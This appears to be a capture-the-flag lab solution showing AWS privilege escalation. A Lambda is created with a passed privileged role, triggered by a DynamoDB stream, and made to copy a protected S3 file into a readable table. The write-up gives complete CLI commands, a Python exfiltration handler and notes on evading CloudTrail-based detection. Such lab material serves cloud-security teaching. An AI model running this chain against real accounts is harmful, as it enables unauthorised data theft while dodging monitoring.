# Solution: Lambda Function Creation + DynamoDB Event Source to Bucket

This scenario demonstrates a data-access privilege escalation where an attacker uses `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` to exfiltrate a protected S3 object — without ever holding `lambda:InvokeFunction` or direct S3 read access.

The technique works by creating a Lambda function with a target role that has `s3:GetObject` on the sensitive bucket, then wiring that function to a DynamoDB stream as a passive trigger. When any record is written to the DynamoDB trigger table, the Lambda fires automatically under the target role's permissions, reads the S3 object, and writes the contents to a second DynamoDB table the attacker can read. The data leaves the S3 bucket without any direct S3 API call originating from the starting principal's credentials.

This pattern appears in environments where developers have been granted broad compute-creation permissions for CI/CD purposes, or where "least privilege" is applied to direct data access but not to the ability to pass roles to serverless functions. The event-driven execution model adds an extra layer of indirection that some CSPM tools and CloudTrail-based alerts miss: the `s3:GetObject` call in CloudTrail is attributed to the Lambda execution role, not the starting user — making the connection between a low-privilege attacker and the data access harder to trace without correlating multiple events across services.

## The Challenge

You start as `pl-prod-lambda-002-to-bucket-starting-user`, an IAM user with three carefully scoped permissions: `iam:PassRole` on the target role, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`. You do not have `s3:GetObject` on the flag bucket, `lambda:InvokeFunction`, or any direct path to the data.

Your goal is to retrieve `flag.txt` from the target S3 bucket: `pl-prod-lambda-002-to-bucket-{account_id}-{suffix}`.

The Terraform-created resources in play are:

- `arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user` — your starting principal
- `arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role` — the target role with S3 read access and DynamoDB write access
- `arn:aws:s3:::pl-prod-lambda-002-to-bucket-{account_id}-{suffix}` — the target bucket containing `flag.txt`
- `arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-trigger-table` — a DynamoDB table with streams enabled; your Lambda trigger
- `arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-exfil-table` — the exfil DynamoDB table where the Lambda will write the flag

## Reconnaissance

Start by confirming your identity and verifying you lack direct S3 access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user

aws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -
# An error occurred (AccessDenied) -- as expected
```

Check the target role to understand what permissions you'll be working with:

```bash
aws iam get-role --role-name pl-prod-lambda-002-to-bucket-target-role \
  --query 'Role.Arn' --output text
# arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role
```

Discover the trigger table's stream ARN — this is what the Lambda event source mapping will connect to:

```bash
aws dynamodb describe-table \
  --table-name pl-prod-lambda-002-to-bucket-trigger-table \
  --query 'Table.LatestStreamArn' \
  --output text
# arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-trigger-table/stream/{timestamp}
```

The table has streams enabled. Any write to this table will fan out to subscribed Lambda functions. That is your passive trigger.

## Exploitation

### Step 1: Write the exfiltration Lambda function

Write a Python handler that uses the target role's `s3:GetObject` permission to read `flag.txt` and the role's `dynamodb:PutItem` permission to write it to the exfil table. This code runs under the target role's identity — not yours:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import os

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    ddb = boto3.client('dynamodb')
    bucket = os.environ['TARGET_BUCKET']
    exfil_table = os.environ['EXFIL_TABLE']
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    flag = obj['Body'].read().decode('utf-8').strip()
    ddb.put_item(
        TableName=exfil_table,
        Item={
            'pk': {'S': 'exfil'},
            'value': {'S': flag}
        }
    )
    return {'statusCode': 200, 'body': 'Exfiltration complete'}
EOF

cd /tmp && zip lambda_payload.zip lambda_function.py
```

### Step 2: Create the Lambda function with the target role

This is the core of the attack. You use `iam:PassRole` to attach the target role as the Lambda's execution role and `lambda:CreateFunction` to deploy your payload. From the moment this function exists, it has the ability to read the flag — it just needs a trigger:

```bash
aws lambda create-function \
  --function-name pl-lambda-002-to-bucket-escalation-fn \
  --runtime python3.12 \
  --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb:///tmp/lambda_payload.zip \
  --timeout 30 \
  --environment "Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-{account_id}-{suffix},EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}"
```

The Lambda function now exists with the target role's S3 read and DynamoDB write permissions — but it has not executed yet.

### Step 3: Create the event source mapping

Connect your Lambda function to the DynamoDB trigger table's stream. This is what replaces `lambda:InvokeFunction`: instead of calling the function directly, you wire it to a stream so it fires automatically on data changes:

```bash
STREAM_ARN=$(aws dynamodb describe-table \
  --table-name pl-prod-lambda-002-to-bucket-trigger-table \
  --query 'Table.LatestStreamArn' --output text)

aws lambda create-event-source-mapping \
  --function-name pl-lambda-002-to-bucket-escalation-fn \
  --event-source-arn "$STREAM_ARN" \
  --starting-position LATEST
```

The mapping starts in a `Creating` state. It typically takes 30-90 seconds to transition to `Enabled`. Poll until it's ready before triggering:

```bash
UUID=$(aws lambda list-event-source-mappings \
  --function-name pl-lambda-002-to-bucket-escalation-fn \
  --query 'EventSourceMappings[0].UUID' --output text)

# Poll until state is Enabled
aws lambda get-event-source-mapping --uuid "$UUID" \
  --query 'State' --output text
# Enabled
```

### Step 4: Trigger the Lambda by writing to the DynamoDB table

Insert a record into the trigger table. This write propagates through the DynamoDB stream and invokes your Lambda function with the target role's execution context:

```bash
aws dynamodb put-item \
  --table-name pl-prod-lambda-002-to-bucket-trigger-table \
  --item '{"pk": {"S": "trigger-1"}}'
```

The Lambda executes asynchronously. Wait 10-15 seconds for the function to complete and for DynamoDB to reflect the write. If the exfil table is empty after 30 seconds, the event source mapping may need a few more seconds despite showing `Enabled` — insert another record and wait again.

## Verification

Check the exfil DynamoDB table for the flag value written by the Lambda execution:

```bash
aws dynamodb get-item \
  --table-name pl-prod-lambda-002-to-bucket-exfil-table \
  --key '{"pk": {"S": "exfil"}}' \
  --query 'Item.value.S' \
  --output text
```

If this returns the flag value, the Lambda executed successfully under the target role and read the S3 object on your behalf.

## Capture the Flag

The flag is `flag.txt` inside the target S3 bucket. The Lambda exfiltrated its contents to the exfil DynamoDB table — the `dynamodb:GetItem` call above is the retrieval step. The canonical CLI retrieval from the source bucket (using the target role's `s3:GetObject` permission, which the Lambda exercised) is:

```bash
aws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -
```

Note that your starting user credentials do not have `s3:GetObject` on this bucket — only the Lambda execution role does. The flag value you captured from the exfil DynamoDB table is what the Lambda read from the bucket using the target role. This is the indirect exfiltration path: your credentials never touched S3 directly; the target role did it on your behalf, triggered by the stream event you manufactured.

## What Happened

You exploited the combination of `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` to reach data you had no direct access to — without ever invoking a Lambda function directly or holding an S3 read permission on your own principal.

The attack chain works because AWS's permission model evaluates each API call in isolation: your `create-event-source-mapping` call is authorized by your IAM user policy, and the subsequent `s3:GetObject` call is authorized by the Lambda execution role's policy. There is no single API call that combines both permission checks, so a misconfigured IAM setup where direct access is restricted but PassRole is not creates a complete exfiltration path.

In real environments, this pattern is exploitable anywhere a developer account has broad Lambda or compute creation permissions and there are roles with narrower data-access grants. The event-driven trigger mechanism makes it harder to detect than a direct `s3:GetObject` or `lambda:InvokeFunction` call: the S3 access in CloudTrail is attributed to the Lambda execution role and appears alongside any other legitimate Lambda invocations accessing that bucket. Correlating it back to the attacker requires joining the `lambda:CreateFunction20150331` and `lambda:CreateEventSourceMapping` events — a step many alert rules miss.
